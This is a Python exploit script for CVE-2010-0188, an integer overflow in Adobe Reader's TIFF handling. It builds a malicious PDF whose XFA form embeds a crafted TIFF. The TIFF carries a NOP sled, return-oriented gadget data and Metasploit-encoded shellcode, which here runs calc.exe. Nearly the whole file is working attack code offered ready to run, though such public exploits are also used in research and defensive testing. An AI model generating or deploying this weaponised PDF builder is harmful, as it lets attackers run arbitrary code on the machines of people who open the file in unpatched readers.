__doc__='''

Title: Adobe PDF LibTiff Integer Overflow Code Execution.
Product: Adobe Acrobat Reader
Version: <=8.3.0, <=9.3.0
CVE: 2010-0188
Author: villy (villys777 at gmail.com)
Site: http://bugix-security.blogspot.com/
Tested : succesfully tested on Adobe Reader 9.1/9.2/9.3 OS Windows XP(SP2,SP3)
------------------------------------------------------------------------
'''
import sys
import base64
import struct
import zlib
import StringIO

SHELLCODE_OFFSET=0x555
TIFF_OFSET=0x2038

# windows/exec - 227 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=process, CMD=calc.exe
buf = "\x2b\xc9\xd9\xc0\xd9\x74\x24\xf4\x5e\xb1\x33\xba\xd9\xb4"
buf += "\x0a\xbe\x31\x56\x15\x03\x56\x15\x83\x1f\xb0\xe8\x4b\x63"
buf += "\x51\x65\xb3\x9b\xa2\x16\x3d\x7e\x93\x04\x59\x0b\x86\x98"
buf += "\x29\x59\x2b\x52\x7f\x49\xb8\x16\xa8\x7e\x09\x9c\x8e\xb1"
buf += "\x8a\x10\x0f\x1d\x48\x32\xf3\x5f\x9d\x94\xca\x90\xd0\xd5"
buf += "\x0b\xcc\x1b\x87\xc4\x9b\x8e\x38\x60\xd9\x12\x38\xa6\x56"
buf += "\x2a\x42\xc3\xa8\xdf\xf8\xca\xf8\x70\x76\x84\xe0\xfb\xd0"
buf += "\x35\x11\x2f\x03\x09\x58\x44\xf0\xf9\x5b\x8c\xc8\x02\x6a"
buf += "\xf0\x87\x3c\x43\xfd\xd6\x79\x63\x1e\xad\x71\x90\xa3\xb6"
buf += "\x41\xeb\x7f\x32\x54\x4b\x0b\xe4\xbc\x6a\xd8\x73\x36\x60"
buf += "\x95\xf0\x10\x64\x28\xd4\x2a\x90\xa1\xdb\xfc\x11\xf1\xff"
buf += "\xd8\x7a\xa1\x9e\x79\x26\x04\x9e\x9a\x8e\xf9\x3a\xd0\x3c"
buf += "\xed\x3d\xbb\x2a\xf0\xcc\xc1\x13\xf2\xce\xc9\x33\x9b\xff"
buf += "\x42\xdc\xdc\xff\x80\x99\x13\x4a\x88\x8b\xbb\x13\x58\x8e"
buf += "\xa1\xa3\xb6\xcc\xdf\x27\x33\xac\x1b\x37\x36\xa9\x60\xff"
buf += "\xaa\xc3\xf9\x6a\xcd\x70\xf9\xbe\xae\x17\x69\x22\x1f\xb2"
buf += "\x09\xc1\x5f\x00"

class CVE20100188Exploit:
	def __init__(self,shellcode):
		self.shellcode = shellcode
		self.tiff64=base64.b64encode(self.gen_tiff())

	def gen_tiff(self):
		tiff =  '\x49\x49\x2a\x00'
		tiff += struct.pack("<L", TIFF_OFSET)

		tiff += '\x90' * (SHELLCODE_OFFSET)
		tiff += self.shellcode
		tiff += '\x90' * (TIFF_OFSET - 8 - len(buf) - SHELLCODE_OFFSET)

		tiff += "\x07\x00\x00\x01\x03\x00\x01\x00"
		tiff += "\x00\x00\x30\x20\x00\x00\x01\x01\x03\x00\x01\x00\x00\x00\x01\x00"
		tiff += "\x00\x00\x03\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x01"
		tiff += "\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x11\x01\x04\x00\x01\x00"
		tiff += "\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00\x01\x00\x00\x00\x30\x20"
		tiff += "\x00\x00\x50\x01\x03\x00\xCC\x00\x00\x00\x92\x20\x00\x00\x00\x00"
		tiff += "\x00\x00\x00\x0C\x0C\x08\x24\x01\x01\x00\xF7\x72\x00\x07\x04\x01"
		tiff += "\x01\x00\xBB\x15\x00\x07\x00\x10\x00\x00\x4D\x15\x00\x07\xBB\x15"
		tiff += "\x00\x07\x00\x03\xFE\x7F\xB2\x7F\x00\x07\xBB\x15\x00\x07\x11\x00"
		tiff += "\x01\x00\xAC\xA8\x00\x07\xBB\x15\x00\x07\x00\x01\x01\x00\xAC\xA8"
		tiff += "\x00\x07\xF7\x72\x00\x07\x11\x00\x01\x00\xE2\x52\x00\x07\x54\x5C"
		tiff += "\x00\x07\xFF\xFF\xFF\xFF\x00\x01\x01\x00\x00\x00\x00\x00\x04\x01"
		tiff += "\x01\x00\x00\x10\x00\x00\x40\x00\x00\x00\x31\xD7\x00\x07\xBB\x15"
		tiff += "\x00\x07\x5A\x52\x6A\x02\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\x58\xCD\x2E\x3C\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\x05\x5A\x74\xF4\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xB8\x49\x49\x2A\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\x00\x8B\xFA\xAF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\x75\xEA\x87\xFE\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xEB\x0A\x5F\xB9\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xE0\x03\x00\x00\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xF3\xA5\xEB\x09\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xE8\xF1\xFF\xFF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xFF\x90\x90\x90\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
		tiff += "\x00\x07\xFF\xFF\xFF\x90\x4D\x15\x00\x07\x31\xD7\x00\x07\x2F\x11"
		tiff += "\x00\x07"
		return tiff
	

	def gen_xml(self):
		xml= '''<?xml version="1.0" encoding="UTF-8" ?> 
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version> 
<interactive>1</interactive> 
<linearized>1</linearized> 
</pdf>
<xdp>
<packets>*</packets> 
</xdp>
<destination>pdf</destination> 
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="topmostSubform" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="612pt" h="792pt" /> 
<medium short="612pt" long="792pt" stock="custom" /> 
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#PageArea1" /> 
<bind match="none" /> 
<field name="ImageField1" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit /> 
</ui>
</field>
<?templateDesigner expand 1?> 
</subform>
<?templateDesigner expand 1?> 
</subform>
<?templateDesigner FormTargetVersion 24?> 
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?> 
<?templateDesigner Zoom 94?> 
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<topmostSubform>
<ImageField1 xfa:contentType="image/tif" href="">'''+self.tiff64 +'''</ImageField1> 
</topmostSubform>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" /> 
<form checksum="a5Mpguasoj4WsTUtgpdudlf4qd4=" xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="topmostSubform">
<instanceManager name="_Page1" /> 
<subform name="Page1">
<field name="ImageField1" /> 
</subform>
<pageSet>
<pageArea name="PageArea1" /> 
</pageSet>
</subform>
</form>
</xdp:xdp>

'''
		return xml

	def gen_pdf(self):
		xml = zlib.compress(self.gen_xml())
		pdf='''%PDF-1.6
1 0 obj 
<</Filter /FlateDecode/Length ''' + str(len(xml)) + '''/Type /EmbeddedFile>>
stream
''' + xml+'''
endstream 
endobj 
2 0 obj 
<</V () /Kids [3 0 R] /T (topmostSubform[0]) >>
endobj 
3 0 obj 
<</Parent 2 0 R /Kids [4 0 R] /T (Page1[0])>>
endobj 
4 0 obj 
<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P 5 0 R/FT /Btn/TU (ImageField1)/Ff 65536/Parent 3 0 R/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (ImageField1[0])/Rect [107.385 705.147 188.385 709.087]>>
endobj 
5 0 obj 
<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent 6 0 R/Type /Page/PieceInfo null>>
endobj 
6 0 obj 
<</Kids [5 0 R]/Type /Pages/Count 1>>
endobj 
7 0 obj 
<</PageMode /UseAttachments/Pages 6 0 R/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm 8 0 R/Type /Catalog>>
endobj 
8 0 obj 
<</DA (/Helv 0 Tf 0 g )/XFA [(template) 1 0 R]/Fields [2 0 R]>>
endobj xref
trailer
<</Root 7 0 R/Size 9>>
startxref
14765
%%EOF'''
		return pdf


if __name__=="__main__":
	print __doc__
	if len(sys.argv) != 2:
		print "Usage: %s [output.pdf]" % sys.argv[0]

	print "Creating Exploit to %s\n"% sys.argv[1]
	exploit=CVE20100188Exploit(buf)
	f = open(sys.argv[1],mode='wb')
	f.write(exploit.gen_pdf())
	f.close()
	print "[+] done !"


